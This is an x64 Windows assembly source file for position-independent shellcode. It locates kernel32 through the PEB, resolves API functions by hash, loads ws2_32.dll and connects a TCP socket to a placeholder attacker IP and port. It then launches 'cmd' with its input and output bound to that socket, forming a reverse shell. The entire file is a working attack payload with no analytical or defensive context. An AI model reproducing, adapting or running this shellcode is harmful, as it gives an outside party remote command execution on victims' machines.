BITS 64

    sub rsp, 0x1000
    mov r15, rsp

find_kernel32:
    xor rcx, rcx
    mov rsi, [gs:rcx + 0x60]
    mov rsi, [rsi + 0x18]
    mov rsi, [rsi + 0x30]
    mov dl, 0x4b

next_module:
    mov rbx, [rsi + 0x10]
    mov rdi, [rsi + 0x40]
    mov rsi, [rsi]
    cmp word [rdi + 12*2], cx
    jne next_module
    cmp byte [rdi], dl
    jne next_module

find_function_shorten:
    jmp find_function_shorten_bnc

find_function_ret:
    pop rsi
    mov [r15 + 0x80], rsi
    jmp resolve_symbols_kernel32

find_function_shorten_bnc:
    call find_function_ret

find_function:
    push rax
    xor rax, rax
    mov eax, [rbx + 0x3c]
    add rax, 0x88
    xor rdi, rdi
    mov edi, [rbx + rax]
    add rdi, rbx
    mov ecx, [rdi + 0x18]
    mov eax, [rdi + 0x20]
    add rax, rbx
    mov [r15 + 0x88], rax

find_function_loop:
    jecxz find_function_finished
    dec rcx
    mov rax, [r15 + 0x88]
    xor rsi, rsi
    mov esi, [rax + rcx * 4]
    add rsi, rbx

compute_hash:
    xor rax, rax
    xor r9, r9
    cld

compute_hash_again:
    lodsb
    test al, al
    jz compute_hash_finished
    ror r9d, 0xd
    add r9, rax
    jmp compute_hash_again

compute_hash_finished:

find_function_compare:
    cmp r9, [rsp + 0x10]
    jnz find_function_loop
    xor rdx, rdx
    mov edx, [rdi + 0x24]
    add rdx, rbx
    mov cx, [rdx + 2 * rcx]
    mov edx, [rdi + 0x1c]
    add rdx, rbx
    xor eax, eax
    mov eax, [rdx + 4 * rcx]
    add rax, rbx
    mov [rsp], rax

find_function_finished:
    pop rax
    ret

resolve_symbols_kernel32:
    xor r14, r14
    mov r14d, 0x78b5b983
    push r14
    call [r15 + 0x80]
    mov [r15 + 0x90], rax

    xor r14, r14
    mov r14d, 0xec0e4e8e
    push r14
    call [r15 + 0x80]
    mov [r15 + 0x98], rax

    xor r14, r14
    mov r14d, 0x16b3fe72
    push r14
    call [r15 + 0x80]
    mov [r15 + 0x100], rax

load_ws2_32:
    mov rcx, 0x642e32335f327377
    mov [r15 + 0x108], rcx
    mov rcx, 0x6c6c
    mov [r15 + 0x110], rcx
    lea rcx, [r15 + 0x108]
    mov rax, [r15 + 0x98]
    call rax

resolve_symbols_ws2_32:
    mov rbx, rax
    xor r14, r14
    mov r14d, 0x3bfcedcb
    push r14
    call [r15 + 0x80]
    mov [r15 + 0x118], rax

    xor r14, r14
    mov r14d, 0xadf509d9
    push r14
    call [r15 + 0x80]
    mov [r15 + 0x120], rax

    xor r14, r14
    mov r14d, 0xb32dba0c
    push r14
    call [r15 + 0x80]
    mov [r15 + 0x128], rax

call_wsastartup:
    pop rbx
    mov rcx, 0x202
    lea rdx, [r15 + 0x300]
    mov rax, [r15 + 0x118]
    call rax

call_wsasocketa:
    mov ecx, 2
    mov rdx, 1
    mov r8, 6
    xor r9, r9
    mov [rsp + 0x20], r9
    mov [rsp + 0x28], r9
    mov rax, [r15 + 0x120]
    call rax
    mov rsi, rax

call_connect:
    mov rcx, rax
    mov r8, 0x10
    lea rdx, [r15 + 0x300]
    mov r9, __IP_PORT__
    mov [rdx + 2], r9
    xor r9, r9
    inc r9d
    inc r9d
    shl r9d, 0x10
    mov [rdx - 2], r9d
    xor r9, r9
    mov [rdx + 8], r9
    mov rax, [r15 + 0x128]
    call rax

setup_si_and_pi:
    mov rdi, r15
    add rdi, 0x500
    mov rbx, rdi
    xor eax, eax
    mov ecx, 0x20
    rep stosd
    mov eax, 0x68
    mov [rbx], eax
    mov eax, 0x100
    mov [rbx + 0x3c], eax
    mov [rbx + 0x50], rsi
    mov [rbx + 0x58], rsi
    mov [rbx + 0x60], rsi

call_createprocessa:
    xor rcx, rcx
    mov rdx, r15
    add rdx, 0x600
    xor eax, eax
    mov al, 0x64
    shl eax, 8
    add al, 0x6d
    shl eax, 8
    add al, 0x63
    mov [rdx], rax
    xor r8, r8
    xor r9, r9
    xor eax, eax
    inc eax
    mov [rsp + 0x20], rax
    dec eax
    mov [rsp + 0x28], rax
    mov [rsp + 0x30], rax
    mov [rsp + 0x38], rax
    mov [rsp + 0x40], rbx
    add rbx, 0x68
    mov [rsp + 0x48], rbx
    mov rax, [r15 + 0x100]
    call rax

call_terminateprocess:
    xor rcx, rcx
    dec rcx
    xor rdx, rdx
    mov rax, [r15 + 0x90]
    call rax
